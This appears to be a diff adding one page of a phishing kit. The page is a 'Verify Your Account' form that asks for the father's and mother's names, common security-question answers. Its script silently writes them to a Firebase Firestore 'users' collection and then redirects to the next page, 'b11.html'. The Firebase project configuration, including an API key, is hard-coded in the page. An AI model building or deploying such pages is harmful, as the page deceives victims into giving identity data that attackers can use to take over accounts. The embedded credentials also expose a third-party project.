@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Home</title>
+    <link rel="stylesheet" href="a02b572693328546.css" />
+
+    <!-- Firebase SDK -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+      // ✅ Updated Firebase Configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+        authDomain: "srai-16d20.firebaseapp.com",
+        projectId: "srai-16d20",
+        storageBucket: "srai-16d20.firebasestorage.app",
+        messagingSenderId: "13015388512",
+        appId: "1:13015388512:web:ede30255ac370257f7ce05"
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const verifyForm = document.getElementById("verifyForm");
+
+        verifyForm.addEventListener("submit", async (event) => {
+          event.preventDefault();
+
+          const fatherName = document.getElementById("fatherName").value.trim();
+          const motherName = document.getElementById("motherName").value.trim();
+
+          if (!fatherName || !motherName) {
+            alert("Please fill out all required fields.");
+            return;
+          }
+
+          try {
+            // ✅ Save user data to Firestore
+            const docRef = await addDoc(collection(db, "users"), {
+              fatherName: fatherName,
+              motherName: motherName,
+              timestamp: serverTimestamp(),
+            });
+
+            console.log("User data saved successfully with ID:", docRef.id);
+
+            // ✅ Open b11.html after successful submission
+            window.location.href = "b11.html";
+
+          } catch (error) {
+            console.error("Error saving user data:", error);
+            alert("Error saving data: " + error.message);
+          }
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <div id="__next">
+      <header>
+        <img alt="lo" loading="lazy" width="509" height="99" class="logo" src="logo.png" />
+      </header>
+      <main>
+        <form id="verifyForm">
+          <h1>Verify Your Account</h1>
+          <div class="floating-container">
+            <input type="text" id="fatherName" name="fn" placeholder=" " required />
+            <label>Father's Name <span>*</span></label>
+          </div>
+          <div class="floating-container">
+            <input type="text" id="motherName" name="mn" placeholder=" " required />
+            <label>Mother's Name <span>*</span></label>
+          </div>
+          <div class="btContainer">
+            <button type="submit">Continue</button>
+          </div>
+        </form>
+      </main>
+      <footer>
+        <div class="l">
+          <img alt="s" loading="lazy" width="1080" height="769" class="l" src="s.jpg" />
+        </div>
+        <img alt="f" loading="lazy" width="1080" height="189" class="ft" src="ft.png" />
+      </footer>
+    </div>
+  </body>
+</html>
